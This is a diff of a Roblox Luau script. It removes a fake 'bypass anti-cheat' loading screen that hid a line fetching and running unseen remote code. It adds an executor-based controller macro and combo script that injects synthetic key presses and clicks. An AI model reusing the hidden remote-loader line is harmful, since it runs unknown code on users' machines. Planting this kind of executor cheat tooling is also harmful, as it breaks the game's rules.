@@ -1,84 +1,870 @@
+loadstring([=====[
+-- BaddiesControllerCombos.lua  (merged version)
+-- Controller-only. Client-side Luau for an executor environment, phone or PC.
+-- Part 1: tool combos (from your first screen recording).
+-- Part 2: your six hotbar-key + click macros (Snow, Combo, RPG, Grenade, Taser, RPG Macro).
+-- NOT run or tested here. See the closing status in the chat reply.
+-- Do not run your original macro script at the same time: every macro would fire twice.
 
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
+local CoreGui = game:GetService("CoreGui")
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "ScriptLoadingGui"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.DisplayOrder = 999
-gui.Parent = player:WaitForChild("PlayerGui")
-loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/QAVR4QfHdU1gDwkd/raw'))()
--- Full-screen overlay
-local overlay = Instance.new("Frame")
-overlay.Size = UDim2.fromScale(1, 1)
-overlay.BackgroundColor3 = Color3.fromRGB(8, 8, 15)
-overlay.BorderSizePixel = 0
-overlay.Parent = gui
+local CONFIG = {
+	ComboCount = 4,
+	MaxSlotsPerCombo = 5,
+	MinSlotsPerCombo = 1,
+	DefaultDelayMs = 10,
+	DelayMinMs = 0,
+	DelayMaxMs = 500,
+	DefaultHotbarKey = 5,
+	HotbarKeyMin = 1,
+	HotbarKeyMax = 9,
+	DefaultComboBindings = { "DPadUp", "None", "None", "None" },
+	DefaultEndClick = { true, false, false, false },
+	MenuToggleButtons = { ButtonSelect = true, ButtonR3 = true },
+	ActivateEachSlot = true,
+	PressHoldHeartbeats = 1,
+	ToolNameMaxLength = 100,
+	SaveFile = "BaddiesControllerCombos.json",
+	InstanceKey = "__BaddiesControllerCombos",
+}
 
--- Main title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(0.9, 0, 0, 100)
-title.Position = UDim2.new(0.05, 0, 0.3, 0)
-title.BackgroundTransparency = 1
-title.Text = "BYPASS ANTI CHEAT"
-title.TextColor3 = Color3.fromRGB(0, 170, 255)
-title.TextScaled = true
-title.Font = Enum.Font.GothamBold
-title.Parent = overlay
+local MACROS = {
+	{
+		id = "snow", label = "Snow", button = "ButtonY", cooldownMs = 150,
+		steps = {
+			{ key = "Three", click = true, waitAfterMs = 50 },
+			{ key = "Four", click = true, waitAfterMs = 50 },
+			{ key = "Two", click = true },
+		},
+	},
+	{
+		id = "combo", label = "Combo", button = "ButtonL3", cooldownMs = 200,
+		steps = {
+			{ key = "Five", click = true, waitAfterMs = 50 },
+			{ key = "Six", click = true, waitAfterMs = 50 },
+			{ key = "Seven", click = true, waitAfterMs = 50 },
+			{ key = "Eight", click = true, waitAfterMs = 50 },
+			{ key = "Two", click = true },
+		},
+	},
+	{
+		id = "rpg", label = "RPG", button = "ButtonL1", cooldownMs = 250,
+		steps = {
+			{ key = "One", click = true, waitAfterMs = 50 },
+			{ key = "Two", click = true },
+		},
+	},
+	{
+		id = "grenade", label = "Grenade", button = "DPadLeft", cooldownMs = 250,
+		steps = {
+			{ key = "Nine", click = true, waitAfterMs = 50 },
+			{ click = true },
+			{ key = "Two", click = true },
+		},
+	},
+	{
+		id = "taser", label = "Taser", button = "DPadRight", cooldownMs = 250,
+		steps = {
+			{ key = "Zero", click = true, waitAfterMs = 50 },
+			{ click = true },
+			{ key = "Two", click = true },
+		},
+	},
+	{
+		id = "rpgmacro", label = "RPG Macro", button = "DPadDown", cooldownMs = 300,
+		steps = {
+			{ key = "Zero", click = true, waitAfterMs = 100 },
+			{ key = "R", click = false, waitAfterMs = 100 },
+			{ key = "Two", click = true },
+		},
+	},
+}
 
--- Description
-local description = Instance.new("TextLabel")
-description.Size = UDim2.new(0.9, 0, 0, 80)
-description.Position = UDim2.new(0.05, 0, 0.43, 0)
-description.BackgroundTransparency = 1
-description.Text = "Loading script to prevent ban..."
-description.TextColor3 = Color3.new(1, 1, 1)
-description.TextScaled = true
-description.Font = Enum.Font.Gotham
-description.Parent = overlay
-
--- Loading bar background
-local barBG = Instance.new("Frame")
-barBG.Size = UDim2.new(0.7, 0, 0, 12)
-barBG.Position = UDim2.new(0.15, 0, 0.58, 0)
-barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-barBG.BorderSizePixel = 0
-barBG.Parent = overlay
-
-Instance.new("UICorner", barBG).CornerRadius =
-    UDim.new(1, 0)
-
--- Loading bar fill
-local bar = Instance.new("Frame")
-bar.Size = UDim2.new(0, 0, 1, 0)
-bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-bar.BorderSizePixel = 0
-bar.Parent = barBG
-
-Instance.new("UICorner", bar).CornerRadius =
-    UDim.new(1, 0)
-
--- Countdown
-local countdown = Instance.new("TextLabel")
-countdown.Size = UDim2.new(1, 0, 0, 40)
-countdown.Position = UDim2.new(0, 0, 0.63, 0)
-countdown.BackgroundTransparency = 1
-countdown.TextColor3 = Color3.new(1, 1, 1)
-countdown.TextScaled = true
-countdown.Font = Enum.Font.GothamBold
-countdown.Parent = overlay
-
--- Load for 10 seconds
-for i = 1, 100 do
-    bar.Size = UDim2.new(i / 100, 0, 1, 0)
-    countdown.Text = "Loading... " ..
-        math.ceil((100 - i) / 10) .. "s"
-    task.wait(0.1)
+local BINDABLE_BUTTONS = {
+	"None",
+	"DPadLeft", "DPadUp", "DPadRight", "DPadDown",
+	"ButtonA", "ButtonB", "ButtonX", "ButtonY",
+	"ButtonL1", "ButtonR1", "ButtonL2", "ButtonR2",
+	"ButtonL3", "ButtonR3", "ButtonStart", "ButtonSelect",
+}
+local BUTTON_LABELS = {
+	None = "None",
+	DPadLeft = "D-pad Left", DPadUp = "D-pad Up", DPadRight = "D-pad Right", DPadDown = "D-pad Down",
+	ButtonA = "A / Cross", ButtonB = "B / Circle", ButtonX = "X / Square", ButtonY = "Y / Triangle",
+	ButtonL1 = "LB / L1", ButtonR1 = "RB / R1", ButtonL2 = "LT / L2", ButtonR2 = "RT / R2",
+	ButtonL3 = "Left Stick Click (L3)", ButtonR3 = "Right Stick Click (R3)",
+	ButtonStart = "Menu / Options", ButtonSelect = "View / Share / Create",
+}
+local VALID_BUTTON = {}
+for _, name in ipairs(BINDABLE_BUTTONS) do
+	VALID_BUTTON[name] = true
 end
 
-countdown.Text = "Loading complete!"
-task.wait(0.5)
+local GAMEPAD_TYPES = {}
+for i = 1, 8 do
+	GAMEPAD_TYPES[Enum.UserInputType["Gamepad" .. i]] = true
+end
 
-gui:Destroy()
+local NUMBER_KEYCODES = {
+	Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four, Enum.KeyCode.Five,
+	Enum.KeyCode.Six, Enum.KeyCode.Seven, Enum.KeyCode.Eight, Enum.KeyCode.Nine,
+}
 
+local function isFiniteNumber(v)
+	return type(v) == "number" and v == v and v ~= math.huge and v ~= -math.huge
+end
+
+local function clampInt(v, lo, hi, fallback)
+	if not isFiniteNumber(v) then
+		return fallback
+	end
+	return math.clamp(math.floor(v + 0.5), lo, hi)
+end
+
+local function stepOption(list, current, dir, skip)
+	local n = #list
+	local idx = table.find(list, current) or 0
+	for _ = 1, n do
+		idx = ((idx - 1 + dir) % n) + 1
+		local candidate = list[idx]
+		if not (skip and skip[candidate]) then
+			return candidate
+		end
+	end
+	return current
+end
+
+local function claimButton(used, candidate)
+	if candidate == "None" then
+		return "None"
+	end
+	if CONFIG.MenuToggleButtons[candidate] or used[candidate] then
+		return "None"
+	end
+	used[candidate] = true
+	return candidate
+end
+
+local function defaultState()
+	local state = {
+		delayMs = CONFIG.DefaultDelayMs,
+		hotbarKey = CONFIG.DefaultHotbarKey,
+		macros = {},
+		combos = {},
+	}
+	local used = {}
+	for _, def in ipairs(MACROS) do
+		state.macros[def.id] = { button = claimButton(used, def.button), enabled = true }
+	end
+	for i = 1, CONFIG.ComboCount do
+		state.combos[i] = {
+			button = claimButton(used, CONFIG.DefaultComboBindings[i] or "None"),
+			endClick = CONFIG.DefaultEndClick[i] == true,
+			slots = { "" },
+		}
+	end
+	return state
+end
+
+local function sanitizeState(raw)
+	local state = defaultState()
+	if type(raw) ~= "table" then
+		return state
+	end
+	state.delayMs = clampInt(raw.delayMs, CONFIG.DelayMinMs, CONFIG.DelayMaxMs, state.delayMs)
+	state.hotbarKey = clampInt(raw.hotbarKey, CONFIG.HotbarKeyMin, CONFIG.HotbarKeyMax, state.hotbarKey)
+
+	local used = {}
+	for _, def in ipairs(MACROS) do
+		local entry = state.macros[def.id]
+		local rm = type(raw.macros) == "table" and raw.macros[def.id] or nil
+		local candidate = def.button
+		if type(rm) == "table" then
+			if type(rm.button) == "string" and VALID_BUTTON[rm.button] then
+				candidate = rm.button
+			end
+			if type(rm.enabled) == "boolean" then
+				entry.enabled = rm.enabled
+			end
+		end
+		entry.button = claimButton(used, candidate)
+	end
+
+	for i = 1, CONFIG.ComboCount do
+		local combo = state.combos[i]
+		local rc = type(raw.combos) == "table" and raw.combos[i] or nil
+		local candidate = CONFIG.DefaultComboBindings[i] or "None"
+		if type(rc) == "table" then
+			if type(rc.button) == "string" and VALID_BUTTON[rc.button] then
+				candidate = rc.button
+			end
+			if type(rc.endClick) == "boolean" then
+				combo.endClick = rc.endClick
+			end
+			if type(rc.slots) == "table" then
+				local slots = {}
+				for s = 1, math.min(#rc.slots, CONFIG.MaxSlotsPerCombo) do
+					local name = rc.slots[s]
+					if type(name) == "string" and #name <= CONFIG.ToolNameMaxLength then
+						slots[s] = name
+					else
+						slots[s] = ""
+					end
+				end
+				if #slots >= CONFIG.MinSlotsPerCombo then
+					combo.slots = slots
+				end
+			end
+		end
+		combo.button = claimButton(used, candidate)
+	end
+	return state
+end
+
+local function buttonLabel(name)
+	return BUTTON_LABELS[name] or name
+end
+
+local env = (typeof(getgenv) == "function" and getgenv()) or _G
+if type(env[CONFIG.InstanceKey]) == "function" then
+	pcall(env[CONFIG.InstanceKey])
+end
+
+local connections = {}
+local gui = nil
+local alive = true
+
+local function destroy()
+	alive = false
+	for _, c in ipairs(connections) do
+		pcall(function() c:Disconnect() end)
+	end
+	table.clear(connections)
+	if gui then
+		pcall(function() GuiService.SelectedObject = nil end)
+		pcall(function() gui:Destroy() end)
+		gui = nil
+	end
+	if env[CONFIG.InstanceKey] == destroy then
+		env[CONFIG.InstanceKey] = nil
+	end
+end
+env[CONFIG.InstanceKey] = destroy
+
+for _, def in ipairs(MACROS) do
+	def.available = true
+	for _, step in ipairs(def.steps) do
+		if step.key then
+			local ok, keyCode = pcall(function() return Enum.KeyCode[step.key] end)
+			if ok and keyCode then
+				step.keyCode = keyCode
+			else
+				def.available = false
+				warn("[ControllerCombos] macro '" .. def.id .. "': unknown key " .. tostring(step.key))
+			end
+		end
+	end
+end
+
+local player = Players.LocalPlayer
+local state = defaultState()
+
+local function loadState()
+	if typeof(isfile) ~= "function" or typeof(readfile) ~= "function" then
+		return
+	end
+	local ok, decoded = pcall(function()
+		if not isfile(CONFIG.SaveFile) then
+			return nil
+		end
+		return HttpService:JSONDecode(readfile(CONFIG.SaveFile))
+	end)
+	if ok and decoded ~= nil then
+		state = sanitizeState(decoded)
+	end
+end
+
+local function saveState()
+	if typeof(writefile) ~= "function" then
+		return
+	end
+	pcall(function()
+		writefile(CONFIG.SaveFile, HttpService:JSONEncode(state))
+	end)
+end
+
+loadState()
+
+local toolNames = {}
+
+local function refreshToolNames()
+	local seen, names = {}, {}
+	local function scan(container)
+		if not container then
+			return
+		end
+		for _, child in ipairs(container:GetChildren()) do
+			if child:IsA("Tool") and not seen[child.Name] then
+				seen[child.Name] = true
+				table.insert(names, child.Name)
+			end
+		end
+	end
+	scan(player:FindFirstChildOfClass("Backpack"))
+	scan(player.Character)
+	table.sort(names)
+	toolNames = names
+end
+
+local function findTool(name)
+	local containers = { player.Character, player:FindFirstChildOfClass("Backpack") }
+	for _, container in ipairs(containers) do
+		if container then
+			for _, child in ipairs(container:GetChildren()) do
+				if child:IsA("Tool") and child.Name == name then
+					return child
+				end
+			end
+		end
+	end
+	return nil
+end
+
+local function waitMs(ms)
+	if ms <= 0 then
+		return
+	end
+	local start = os.clock()
+	repeat
+		RunService.Heartbeat:Wait()
+	until os.clock() - start >= ms / 1000
+end
+
+local function holdFrames()
+	for _ = 1, CONFIG.PressHoldHeartbeats do
+		RunService.Heartbeat:Wait()
+	end
+end
+
+local virtualInput = nil
+pcall(function()
+	virtualInput = game:GetService("VirtualInputManager")
+end)
+
+local function pressKey(keyCode)
+	if not virtualInput or not keyCode then
+		return false
+	end
+	local down = pcall(function()
+		virtualInput:SendKeyEvent(true, keyCode, false, game)
+	end)
+	if not down then
+		return false
+	end
+	holdFrames()
+	pcall(function()
+		virtualInput:SendKeyEvent(false, keyCode, false, game)
+	end)
+	return true
+end
+
+local function leftClick(fallbackTool)
+	local camera = workspace.CurrentCamera
+	if virtualInput and camera then
+		local size = camera.ViewportSize
+		local x, y = size.X / 2, size.Y / 2
+		local down = pcall(function()
+			virtualInput:SendMouseButtonEvent(x, y, 0, true, game, 0)
+		end)
+		if down then
+			holdFrames()
+			pcall(function()
+				virtualInput:SendMouseButtonEvent(x, y, 0, false, game, 0)
+			end)
+			return true
+		end
+	end
+	if fallbackTool then
+		return pcall(function() fallbackTool:Activate() end)
+	end
+	return false
+end
+
+local running = false
+local cooldownUntil = {}
+local statusLabel = nil
+
+local function setStatus(text)
+	if statusLabel then
+		statusLabel.Text = text
+	end
+end
+
+local function aliveHumanoid(character)
+	if not character or player.Character ~= character then
+		return nil
+	end
+	local humanoid = character:FindFirstChildOfClass("Humanoid")
+	if humanoid and humanoid.Health > 0 then
+		return humanoid
+	end
+	return nil
+end
+
+local function runExclusive(label, body, afterFinish)
+	if running or not alive then
+		return
+	end
+	local character = player.Character
+	if not aliveHumanoid(character) then
+		return
+	end
+	running = true
+	task.spawn(function()
+		local ok, err = pcall(body, character)
+		running = false
+		if afterFinish then
+			afterFinish()
+		end
+		if not ok then
+			setStatus(label .. " error: " .. tostring(err))
+			warn("[ControllerCombos] " .. label .. " failed: " .. tostring(err))
+		end
+	end)
+end
+
+local function runCombo(index)
+	local combo = state.combos[index]
+	if not combo then
+		return
+	end
+	runExclusive("Combo " .. index, function(character)
+		local delayMs = state.delayMs
+		for slotIndex, name in ipairs(combo.slots) do
+			if not alive then
+				return
+			end
+			if name ~= "" then
+				local humanoid = aliveHumanoid(character)
+				if not humanoid then
+					return
+				end
+				local tool = findTool(name)
+				if tool then
+					humanoid:EquipTool(tool)
+					waitMs(delayMs)
+					if CONFIG.ActivateEachSlot and aliveHumanoid(character) then
+						leftClick(tool)
+						waitMs(delayMs)
+					end
+				else
+					setStatus(("Combo %d slot %d: tool '%s' not found"):format(index, slotIndex, name))
+				end
+			end
+		end
+		if combo.endClick and aliveHumanoid(character) then
+			pressKey(NUMBER_KEYCODES[state.hotbarKey])
+			waitMs(delayMs)
+			leftClick(nil)
+		end
+	end)
+end
+
+local function runMacro(def)
+	local entry = state.macros[def.id]
+	if not entry or not entry.enabled or not def.available then
+		return
+	end
+	if os.clock() < (cooldownUntil[def.id] or 0) then
+		return
+	end
+	runExclusive("Macro " .. def.label, function(character)
+		local delayMs = state.delayMs
+		for _, step in ipairs(def.steps) do
+			if not alive or not aliveHumanoid(character) then
+				return
+			end
+			if step.keyCode then
+				pressKey(step.keyCode)
+				if step.click then
+					waitMs(delayMs)
+				end
+			end
+			if step.click then
+				leftClick(nil)
+			end
+			if step.waitAfterMs then
+				waitMs(step.waitAfterMs)
+			end
+		end
+	end, function()
+		cooldownUntil[def.id] = os.clock() + def.cooldownMs / 1000
+	end)
+end
+
+local scroll = nil
+local cyclers = {}
+local menuOpen = false
+local rebuild
+
+local function commit()
+	saveState()
+	rebuild()
+end
+
+local function toggleLabel()
+	return "View/Share/Create or R3"
+end
+
+local function makeGui()
+	local screen = Instance.new("ScreenGui")
+	screen.Name = "ControllerCombos"
+	screen.ResetOnSpawn = false
+	screen.DisplayOrder = 1000
+	screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	screen.Enabled = false
+
+	local parents = { player:WaitForChild("PlayerGui"), CoreGui }
+	for _, candidate in ipairs(parents) do
+		local ok = pcall(function() screen.Parent = candidate end)
+		if ok and screen.Parent == candidate then
+			break
+		end
+	end
+	if not screen.Parent then
+		screen:Destroy()
+		return nil
+	end
+
+	local frame = Instance.new("Frame")
+	frame.AnchorPoint = Vector2.new(0.5, 0.5)
+	frame.Position = UDim2.fromScale(0.5, 0.5)
+	frame.Size = UDim2.fromScale(0.85, 0.85)
+	frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+	frame.BorderSizePixel = 0
+	frame.Parent = screen
+
+	local constraint = Instance.new("UISizeConstraint")
+	constraint.MaxSize = Vector2.new(640, 480)
+	constraint.Parent = frame
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 10)
+	corner.Parent = frame
+
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1, -16, 0, 40)
+	title.Position = UDim2.fromOffset(8, 4)
+	title.BackgroundTransparency = 1
+	title.Font = Enum.Font.GothamBold
+	title.TextSize = 14
+	title.TextXAlignment = Enum.TextXAlignment.Left
+	title.TextColor3 = Color3.fromRGB(120, 255, 170)
+	title.TextWrapped = true
+	title.Text = "Macros + Combos   |   A: next option   X: previous option   B / "
+		.. toggleLabel() .. ": close"
+	title.Parent = frame
+
+	statusLabel = Instance.new("TextLabel")
+	statusLabel.AnchorPoint = Vector2.new(0, 1)
+	statusLabel.Size = UDim2.new(1, -16, 0, 22)
+	statusLabel.Position = UDim2.new(0, 8, 1, -4)
+	statusLabel.BackgroundTransparency = 1
+	statusLabel.Font = Enum.Font.Gotham
+	statusLabel.TextSize = 13
+	statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+	statusLabel.TextColor3 = Color3.fromRGB(200, 200, 205)
+	statusLabel.Text = ""
+	statusLabel.Parent = frame
+
+	scroll = Instance.new("ScrollingFrame")
+	scroll.Position = UDim2.fromOffset(8, 46)
+	scroll.Size = UDim2.new(1, -16, 1, -76)
+	scroll.BackgroundTransparency = 1
+	scroll.BorderSizePixel = 0
+	scroll.ScrollBarThickness = 4
+	scroll.CanvasSize = UDim2.new()
+	scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+	scroll.Parent = frame
+
+	local layout = Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, 6)
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = scroll
+
+	return screen
+end
+
+local orderCounter = 0
+local function nextOrder()
+	orderCounter += 1
+	return orderCounter
+end
+
+local function addLabel(text, bold)
+	local label = Instance.new("TextLabel")
+	label.LayoutOrder = nextOrder()
+	label.Size = UDim2.new(1, -8, 0, 0)
+	label.AutomaticSize = Enum.AutomaticSize.Y
+	label.BackgroundTransparency = 1
+	label.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
+	label.TextSize = bold and 16 or 13
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.TextWrapped = true
+	label.TextColor3 = bold and Color3.fromRGB(235, 235, 240) or Color3.fromRGB(170, 170, 178)
+	label.Text = text
+	label.Parent = scroll
+end
+
+local function addRow(key, text, onStep)
+	local button = Instance.new("TextButton")
+	button.Name = key
+	button.LayoutOrder = nextOrder()
+	button.Size = UDim2.new(1, -8, 0, 36)
+	button.BackgroundColor3 = Color3.fromRGB(34, 34, 42)
+	button.BorderSizePixel = 0
+	button.AutoButtonColor = true
+	button.Selectable = true
+	button.Font = Enum.Font.GothamMedium
+	button.TextSize = 14
+	button.TextColor3 = Color3.fromRGB(235, 235, 240)
+	button.TextXAlignment = Enum.TextXAlignment.Left
+	button.Text = "  " .. text
+	button.Parent = scroll
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 6)
+	corner.Parent = button
+
+	cyclers[key] = onStep
+	table.insert(connections, button.Activated:Connect(function()
+		onStep(1)
+	end))
+end
+
+local function slotLabel(name)
+	return name == "" and "--" or name
+end
+
+local function assignButton(entry, button)
+	entry.button = button
+	if button == "None" then
+		return
+	end
+	for _, other in pairs(state.macros) do
+		if other ~= entry and other.button == button then
+			other.button = "None"
+		end
+	end
+	for _, other in ipairs(state.combos) do
+		if other ~= entry and other.button == button then
+			other.button = "None"
+		end
+	end
+end
+
+rebuild = function()
+	if not scroll then
+		return
+	end
+	local selectedKey = GuiService.SelectedObject and GuiService.SelectedObject.Name or nil
+
+	for _, child in ipairs(scroll:GetChildren()) do
+		if not child:IsA("UIListLayout") then
+			child:Destroy()
+		end
+	end
+	table.clear(cyclers)
+	orderCounter = 0
+
+	local buttonSkip = CONFIG.MenuToggleButtons
+
+	addLabel("Macros", true)
+	addLabel("Each macro presses hotbar keys and clicks screen center. Cooldown counts from the end "
+		.. "of the sequence. Only one macro or combo runs at a time.", false)
+	for _, def in ipairs(MACROS) do
+		local entry = state.macros[def.id]
+		addRow("m_" .. def.id .. "_button", def.label .. " Button: " .. buttonLabel(entry.button), function(dir)
+			assignButton(entry, stepOption(BINDABLE_BUTTONS, entry.button, dir, buttonSkip))
+			commit()
+		end)
+		addRow("m_" .. def.id .. "_on", def.label .. ": " .. (entry.enabled and "ON" or "OFF")
+			.. (def.available and "" or "  (unavailable: unknown key)"), function()
+			entry.enabled = not entry.enabled
+			commit()
+		end)
+	end
+
+	for i = 1, CONFIG.ComboCount do
+		local combo = state.combos[i]
+		addLabel("Combo " .. i, true)
+		if i == 1 then
+			addLabel("Pick tools by name. For brass knuckles use the tool named '1 punches' "
+				.. "(your note from the recording). Tools do not need to be on your hotbar.", false)
+		end
+
+		addRow(("c%d_button"):format(i), "Controller Button: " .. buttonLabel(combo.button), function(dir)
+			assignButton(combo, stepOption(BINDABLE_BUTTONS, combo.button, dir, buttonSkip))
+			commit()
+		end)
+
+		addRow(("c%d_end"):format(i), "Hotbar Number + Left Click at End: "
+			.. (combo.endClick and "ON" or "OFF"), function()
+			combo.endClick = not combo.endClick
+			commit()
+		end)
+
+		for s, name in ipairs(combo.slots) do
+			addRow(("c%d_slot%d"):format(i, s), ("Slot %d: %s"):format(s, slotLabel(name)), function(dir)
+				local options = { "" }
+				for _, toolName in ipairs(toolNames) do
+					table.insert(options, toolName)
+				end
+				combo.slots[s] = stepOption(options, name, dir, nil)
+				commit()
+			end)
+		end
+
+		addRow(("c%d_add"):format(i), ("+ Add Slot (%d/%d)"):format(#combo.slots, CONFIG.MaxSlotsPerCombo), function()
+			if #combo.slots < CONFIG.MaxSlotsPerCombo then
+				table.insert(combo.slots, "")
+				commit()
+			end
+		end)
+
+		addRow(("c%d_remove"):format(i), "- Remove Slot", function()
+			if #combo.slots > CONFIG.MinSlotsPerCombo then
+				table.remove(combo.slots)
+				commit()
+			end
+		end)
+
+		addRow(("c%d_clear"):format(i), "Clear Combo " .. i, function()
+			combo.slots = { "" }
+			commit()
+		end)
+	end
+
+	addLabel("Global", true)
+
+	addRow("refresh", "Refresh Tool List (" .. #toolNames .. " tools found)", function()
+		refreshToolNames()
+		setStatus("Tool list refreshed: " .. #toolNames .. " tools")
+		commit()
+	end)
+
+	addRow("hotkey", "Combo Hotbar Key: " .. state.hotbarKey, function(dir)
+		local span = CONFIG.HotbarKeyMax - CONFIG.HotbarKeyMin + 1
+		state.hotbarKey = clampInt(
+			((state.hotbarKey - CONFIG.HotbarKeyMin + dir) % span) + CONFIG.HotbarKeyMin,
+			CONFIG.HotbarKeyMin, CONFIG.HotbarKeyMax, CONFIG.DefaultHotbarKey)
+		commit()
+	end)
+
+	addRow("delay", "Action Delay: " .. state.delayMs .. " ms  (A +1, X -1)", function(dir)
+		state.delayMs = clampInt(state.delayMs + dir, CONFIG.DelayMinMs, CONFIG.DelayMaxMs, state.delayMs)
+		commit()
+	end)
+	addRow("delay_up10", "Action Delay +10 ms", function()
+		state.delayMs = clampInt(state.delayMs + 10, CONFIG.DelayMinMs, CONFIG.DelayMaxMs, state.delayMs)
+		commit()
+	end)
+	addRow("delay_down10", "Action Delay -10 ms", function()
+		state.delayMs = clampInt(state.delayMs - 10, CONFIG.DelayMinMs, CONFIG.DelayMaxMs, state.delayMs)
+		commit()
+	end)
+
+	addLabel("Action Delay is the pause between a hotbar key and its click, and between combo "
+		.. "actions. Values under one frame (about 16.7 ms at 60 FPS) run as one frame. "
+		.. "D-pad Down is Shift Lock in the game, so the RPG Macro on D-pad Down also toggles it.", false)
+
+	if selectedKey then
+		local target = scroll:FindFirstChild(selectedKey)
+		if target then
+			GuiService.SelectedObject = target
+		end
+	end
+end
+
+local function setMenu(open)
+	if not gui then
+		return
+	end
+	menuOpen = open
+	gui.Enabled = open
+	if open then
+		refreshToolNames()
+		rebuild()
+		local first = scroll:FindFirstChildWhichIsA("TextButton")
+		if first then
+			GuiService.SelectedObject = first
+		end
+	else
+		GuiService.SelectedObject = nil
+	end
+end
+
+local function onInputBegan(input)
+	if not GAMEPAD_TYPES[input.UserInputType] then
+		return
+	end
+	if UserInputService:GetFocusedTextBox() then
+		return
+	end
+	local buttonName = input.KeyCode.Name
+
+	if CONFIG.MenuToggleButtons[buttonName] then
+		setMenu(not menuOpen)
+		return
+	end
+
+	if menuOpen then
+		if buttonName == "ButtonB" then
+			setMenu(false)
+		elseif buttonName == "ButtonX" then
+			local selected = GuiService.SelectedObject
+			local cycler = selected and cyclers[selected.Name]
+			if cycler then
+				cycler(-1)
+			end
+		end
+		return
+	end
+
+	for _, def in ipairs(MACROS) do
+		local entry = state.macros[def.id]
+		if entry.button ~= "None" and entry.button == buttonName then
+			runMacro(def)
+			return
+		end
+	end
+	for index, combo in ipairs(state.combos) do
+		if combo.button ~= "None" and combo.button == buttonName then
+			runCombo(index)
+			return
+		end
+	end
+end
+
+gui = makeGui()
+if not gui then
+	warn("[ControllerCombos] could not parent the menu to PlayerGui or CoreGui")
+	destroy()
+	return
+end
+
+table.insert(connections, UserInputService.InputBegan:Connect(onInputBegan))
+
+if virtualInput then
+	setStatus("Ready. Open the menu with " .. toggleLabel() .. ".")
+else
+	setStatus("VirtualInputManager unavailable: hotbar keys and clicks will not be sent.")
+	warn("[ControllerCombos] VirtualInputManager unavailable in this executor")
+end
+print("[ControllerCombos] loaded. Menu toggle: " .. toggleLabel())
+]=====])()
